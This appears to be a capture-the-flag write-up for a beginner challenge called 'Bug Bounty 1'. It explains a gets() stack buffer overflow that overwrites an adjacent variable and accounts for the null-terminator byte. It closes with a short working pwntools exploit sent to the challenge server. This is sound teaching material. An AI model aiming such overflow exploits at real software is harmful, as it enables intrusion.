![](./img/1.png)

[Source code](./handout/Bug_Bounty_1)

So here is the interaction with the challenge:

![](./img/2.png)

We have a view of the stack, and from the source code we know that the name variable is 40 bytes 

To get the flag we need to successfully change the `number` variable. The `gets` function is vulnerable to buffer overflow. That means that if we write in the name `var` more than 40 bytes, it will overwrite the variable next to him

Let's use pwntools to do it

![](./img/3.png)

Here I sent the letter `A` 39 times (39 bytes) and the next variable is not changed

![](./img/4.png)

But here with 40 A's it changed and we get the flag. Why is that ? Isn't it supposed to be 41 ?
Yes it is, but the `gets` function add at the end of the `name` variable a `null terminator '\x00'` character and this character overwrite the variable `number` (that mean that we in fact we sent 41 bytes). We can see on the picture the first bytes of number is `00`.


```python
from pwn import *

# Connect to the instance
conn = remote('chal.sigpwny.com', 1343)
# Use process() if you want to test locally
# conn = process('./challenge')

# Receive the prompt
conn.recvuntil(b'> ')

# Write your exploit here!
exploit = b'A'*40

# Send the payload
conn.sendline(exploit)

# Drop to an interactive shell to interact with the process
conn.interactive()
``` 

[Bug Bounty 2](./Bug_Bounty_2.md)

